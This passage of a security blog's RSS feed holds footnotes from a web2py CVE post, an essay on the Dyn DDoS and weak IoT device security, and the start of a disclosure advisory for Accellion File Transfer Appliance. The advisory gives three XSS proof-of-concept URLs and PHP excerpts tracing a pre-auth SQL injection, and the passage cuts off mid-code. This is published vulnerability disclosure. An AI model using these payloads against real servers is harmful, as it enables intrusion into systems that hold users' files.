      &lt;p&gt;其實 CVE-2016-3957 並非不安全的設計，在跟 CVE team 溝通的過程中發現 web2py 開始使用 JSON 取代 Pickle [&lt;a href=&quot;https://github.com/web2py/web2py/commit/0820926b500a321060ef6a76ce89fd35a252f8b0&quot;&gt;Ref&lt;/a&gt;]，因此判定 web2py 認為目前的設計是不洽當的，給予此編號。後來官方因故將 Pickle 改了回來，不過在沒有洩漏加密字串的前提下已經是安全的了。 &lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:note2&quot; role=&quot;doc-endnote&quot;&gt;
      &lt;p&gt;在自行架設的 web2py 環境中只會執行一次，沒有去細追 web2py 官方網站為何執行兩次。 &lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
</description>
                <link>https://devco.re/blog/2017/01/03/web2py-unserialize-code-execution-CVE-2016-3957/</link>
                <guid>https://devco.re/blog/2017/01/03/web2py-unserialize-code-execution-CVE-2016-3957</guid>
                <pubDate>Tue, 03 Jan 2017 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>IoT設備商別成為幫兇 從Dyn DDoS攻擊事件看IoT安全</title>
                <description>&lt;h3 id=&quot;萬物皆聯網成為萬物皆可駭&quot;&gt;萬物皆聯網成為萬物皆可駭&lt;/h3&gt;

&lt;p&gt;2016年10月21日知名網路服務 Dyn 遭受殭屍網路發動三波巨大規模 DDoS 攻擊，世界各大網站服務皆因為此攻擊而中斷，包括 Amazon、Twitter、Github、PayPal 等大型網站都因此受到影響。資安人員研究發現，本次 DDoS 攻擊的發起者未明，但多數攻擊流量來自殭屍網路「Mirai」，利用 IPCAM、CCTV、DVR、IoT 裝置等系統進行 DDoS 攻擊。為什麼這些設備會成為攻擊的幫凶呢？我們又該如何自保呢？&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;一個攻擊事件，一定有背後的原因。攻擊者一定是有所求，才會進行攻擊，可能是求名、求利或求樂趣。因為 DDoS 攻擊會直接影響目標系統的運作，對系統營運造成影響，在黑色產業的循環中通常會利用這種攻擊來勒索錢財。例如針對營運線上遊戲的公司進行 DDoS 攻擊，讓遊戲服務中斷，逼迫企業將主機的連線花錢「贖」回來。但 Dyn 這次的事件各家都沒有收到類似的勒索信，因此資安專家們推測，這可能是一次練兵，或者甚至是 DDoS 攻擊服務的行銷手法。如果我們用黑色產業的角度去思考一個攻擊行為，就會有截然不同的看法。試想，如果這是一次駭客組織的商業行銷行為，目的是展現這個團隊的 DDoS 攻擊火力，這樣的成果是否可以稱作是一個成功案例呢？如果你是服務購買者，是否對這樣的服務有信心呢？&lt;/p&gt;

&lt;p&gt;利用 IoT 裝置及網通設備佈建殭屍網路 (botnet) 已經不是新聞。Internet Census 2012 是一次資安圈的大事件，一個稱為 Carna 的 botnet 利用了全世界 42 萬台裝置，掃描全世界整個 IPv4 設備，蒐集 IP 使用狀況、連接埠、服務標頭等資訊，並且提供共計 9TB 資料開放下載研究。而這個 botnet 多數利用路由器 (router) 的漏洞，利用預設密碼、空密碼登入設備，植入後門供攻擊者控制。而後的幾次大型攻擊事件都與 IoT 及嵌入式裝置有關係，讓 IoT 的口號「萬物皆聯網」成為「萬物皆可駭」，也讓資安研究人員對於研究這類型設備趨之若鶩。近年智慧車輛不斷發展，國際間也不少智慧車輛被駭的事件。車輛被駭影響的就不單是資訊系統，更會波及人身安全甚至整個城市的交通，資安考量的影響也遠比以前嚴重。&lt;/p&gt;

&lt;h3 id=&quot;連網裝置成為駭客下手的主要原因&quot;&gt;連網裝置成為駭客下手的主要原因&lt;/h3&gt;

&lt;p&gt;究竟是怎樣的安全漏洞讓攻擊者這麼輕易利用呢？目前攻擊者及 botnet 多數利用的還是使用預設密碼、或甚至是沒有設定密碼的裝置。網站 &lt;a href=&quot;https://www.insecam.org&quot;&gt;Insecam&lt;/a&gt; 揭露了全世界數萬支未修改密碼的攝影機，再再顯示不少民眾或公司行號購買了監視器，卻沒有健全的資安意識，讓監視器暴露於全世界之中。更多攝影機、監視器等的資安議題可以參考我們的文章&lt;a href=&quot;http://devco.re/blog/2014/09/24/security-of-ip-camera-and-nvr/&quot;&gt;「網路攝影機、DVR、NVR 的資安議題 - 你知道我在看你嗎？」&lt;/a&gt;。除了預設密碼之外，設備中的後門也是一個大問題。不少路由器、無線基地台廠商被爆出系統中含有測試用的登入帳號，該帳號無法關閉、無法移除，且容易被攻擊者進行研究取得。除了等待廠商升級韌體來修補該問題之外，沒有其他解法，因此成為攻擊者大量取得控制權的方式之一。&lt;/p&gt;

&lt;p&gt;IoT 裝置為什麼會成為攻擊者下手的目標呢？我們可以分成幾點來探討。&lt;/p&gt;

&lt;p&gt;第一，嵌入式裝置以往的設計都是不連網，IoT 的風潮興起之後，各廠商也為了搶市場先機，加速推出產品，將原本的產品加上網路功能，甚至 App 控制功能。而求快的結果就是犧牲資安考量，加上廠商可能原本並非網路專長，也沒有足夠的資安人員檢視安全性，導致設計出來的產品資安漏洞層出不窮。產品的設計必須嚴守 Security by Design 的原則，在開發初期的每個環節都納入資安考量，並且遵守 Secure Coding 規範，避免在產品後期疊床架屋，造成要釐清資安問題的根源更難如登天。&lt;/p&gt;

&lt;p&gt;第二，產品的更新機制問題。IoT 裝置的更新機制在早期並沒有謹慎考量，需要使用者自行下載韌體更新，甚至有些裝置必須回廠才能進行更新。不少使用者只要產品沒有出問題，並不會主動進行韌體更新，甚至覺得更新只會造成更多問題。在沒有便利更新機制的情況之下，設備的資安問題更難以被妥善處理。近期因為資安事件頻傳，FOTA (Firmware Over-The-Air) 機制才逐漸被重視，但其他資安問題也隨即而來。如何確保韌體的完整性？如何防止攻擊者下載韌體進行研究修改？這些都是廠商需要不斷去反覆思量的。&lt;/p&gt;

&lt;p&gt;第三，敵暗我明，也是我們認為最重要的一點。我們認為資安就是攻擊者與防禦者的一場資訊不對稱戰爭，防禦者（廠商）通常只會憑藉著自己的知識跟想像進行防禦，但卻不知道攻擊者的思維跟手法。就像春秋時代公輸般，建造雲梯協助楚國攻擊宋國的城池。唯有了解攻擊者，化解這個不對稱的資訊，才能有效的進行防禦，如同墨子了解雲梯的攻擊方式，模擬各種對應防禦的手法，才成功讓楚王放棄攻擊。不僅是 IoT 廠商，所有企業都必須了解攻擊者的思維、手法，知曉這個黑色產業的運作，甚至針對攻擊的方式進行模擬演練，將每一個防禦的缺口補足，才可以正面迎戰攻擊者。&lt;/p&gt;

&lt;h3 id=&quot;設備商避免成為幫凶消費者也應自保&quot;&gt;設備商避免成為幫凶，消費者也應自保&lt;/h3&gt;

&lt;p&gt;身為使用者，我們該如何確認自己的設備有沒有被感染呢？若被感染該怎麼有效清除呢？建議先搜尋網路上目前已公開有漏洞的廠牌及型號，若在問題清單之內，先將整台設備備份設定後，回復原廠初始設定，以確保攻擊者放置的惡意程式都被清除。接著更新廠商所釋出的新版韌體，並記得在更新安裝完畢後立即更換密碼以防二度被入侵。若廠商無釋出更新，可能是資安不被重視，也可能是廠商已經結束營運。如果還是選擇要使用這個設備，建議將設備轉放在內部網路，或者是在前面增加防禦設備，避免攻擊者入侵。&lt;/p&gt;

&lt;p&gt;至於廠商該怎麼跟上資安的腳步呢？我們認為目前廠商最重要的就是資安意識。這已經是老生常談，以往網路產業逐漸重視資安，但跨入網路的其他資訊產業恐怕還沒意識到資安的嚴重性。凡舉傳統家電轉為智慧家電、車輛轉為智慧車輛、甚至基礎建設也逐漸資訊化的現在，若這些踏入網路的產業沒有相對應的資安意識，恐怕很難在初期就預防風險的發生。企業也必須盤點風險的所在，透過人工滲透測試模擬攻擊者的攻擊思維及路徑，如同軍事演習一般，將入侵的途徑一一封鎖。我們認為 IoT 等嵌入式裝置、智慧家電、甚至網通資安設備本身，未來都會是駭客組織攻擊的對象，利用更新的困難度跟管理者的疏於管理，建置一個個大規模殭屍大軍，成為未來戰爭的棋子。我們期許未來廠商建構產品時，都能優先納入資安考量，不成為黑色產業的幫凶，也讓國際認可台灣產品是資安至上的優良品質。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2016/12/26/a-look-into-the-growth-of-IoT-DDoS-attacks/</link>
                <guid>https://devco.re/blog/2016/12/26/a-look-into-the-growth-of-IoT-DDoS-attacks</guid>
                <pubDate>Mon, 26 Dec 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Accellion File Transfer Appliance 弱點報告</title>
                <description>&lt;p&gt;By &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver/&quot;&gt;English Version&lt;/a&gt; &lt;br /&gt;
&lt;a href=&quot;/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;accellion-fta-介紹&quot;&gt;Accellion FTA 介紹&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
Accellion File Transfer Appliance (以下簡稱 FTA) 為一款安全檔案傳輸服務，可讓使用者線上分享、同步檔案，且所有檔案皆經 AES 128/256 加密，Enterprise 版本更支援 SSL VPN 服務並整合 AD, LDAP, Kerberos 等 Single Sign-on 機制。
&lt;br /&gt;&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;漏洞描述&quot;&gt;漏洞描述&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
在研究過程中，於 FTA 版本 FTA_9_12_0 (13-Oct-2015 Release) 上，發現了下列弱點：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Cross-Site Scripting x 3&lt;/li&gt;
  &lt;li&gt;Pre-Auth SQL Injection leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Known-Secret-Key leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Local Privilege Escalation x 2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;以上弱點可使不需經過認證的攻擊者，成功遠端攻擊 FTA 伺服器並取得最高權限，當攻擊者完全控制伺服器後，可取得伺服器上的加密檔案與用戶資料等。&lt;/p&gt;

&lt;p&gt;弱點經回報 CERT/CC 後取得共四個獨立 CVE 編號 (CVE-2016-2350, CVE-2016-2351, CVE-2016-2352, CVE-2016-2353)。
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;影響範圍&quot;&gt;影響範圍&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
根據公開資料掃描，全球共發現 1217 台 FTA 存活主機，主要分布地點為美國，其次加拿大、澳洲、英國與新加坡。根據存活主機的域名、SSL Certificate 發現 FTA 使用客戶遍及政府、教育、企業等領域，其中不乏一些知名品牌。
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;漏洞分析與利用&quot;&gt;漏洞分析與利用&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;multiple-cross-site-scripting-cve-2016-2350&quot;&gt;Multiple Cross-Site Scripting (CVE-2016-2350)&lt;/h4&gt;

&lt;h5 id=&quot;1-xss-in-move_partition_framehtml&quot;&gt;1. XSS in move_partition_frame.html&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/move_partition_frame.html&lt;br /&gt;
?f2=’-prompt(document.domain);//&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;2-xss-in-getimageajaxphp&quot;&gt;2. XSS in getimageajax.php&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/web/getimageajax.php&lt;br /&gt;
?documentname=”onerror=”prompt(document.domain)//&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;3-xss-in-wminfohtml&quot;&gt;3. XSS in wmInfo.html&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/web/wmInfo.html&lt;br /&gt;
?msg=ssologout&lt;br /&gt;
&amp;amp;loginurl=”&amp;gt;&amp;lt;svg/onload=”prompt(document.domain)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;pre-auth-sql-injection-leads-to-rce-cve-2016-2351&quot;&gt;Pre-Auth SQL Injection leads to RCE (CVE-2016-2351)&lt;/h4&gt;

&lt;p&gt;經過代碼審查後，在 FTA 中發現一個不須驗證的 SQL Injection，這使得惡意使用者可透過 SQL Injection 存取伺服器的敏感檔案及個人資料，並配合權限設定問題導致遠端代碼執行。問題出在 security_key2.api 中所呼叫到的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client_properties( ... )&lt;/code&gt; 函數中！&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/home/seos/courier/security_key2.api&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;_decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;_generate_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_app_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_username&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;opendb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$client_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;client_properties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;其中 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$g_username&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$client_id&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$password&lt;/code&gt; 皆為攻擊者可控參數，雖然有個 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_decrypt( ... )&lt;/code&gt; 函數對密碼進行處理，但是與弱點觸發並無相關。其中要注意是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; 的值會被代入成全域變數，代表當前使用的 Application ID，並且在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;opendb( )&lt;/code&gt; 使用，其中在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;opendb( )&lt;/code&gt; 內有以下代碼：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;DB_MASTER&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_app_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mysql_select_db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql_select_db&lt;/code&gt; 中所開啟資料庫的名稱由使用者可控，如給錯誤的值將導致程式無法繼續執行下去，所以必須將 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; 偽造成正確的內容。&lt;/p&gt;

&lt;p&gt;接著是最主要的函數 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client_properties( $client_id )&lt;/code&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;client_properties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$manager&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$order_by&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;client_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$order_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;a&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$limit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;SELECT t_mail_server.* FROM t_mail_server &apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;SELECT t_mail_server.*, t_profile.c_flag as profile_flag FROM t_mail_server, t_profile &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_type&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mysql_escape_like&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user_type&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$manager&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user_status&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;construct_where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;

    &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mysql_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db_result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;fatal_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;exec:mysql_query(&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;) respond:&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;__FILE__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;221&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;construct_where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
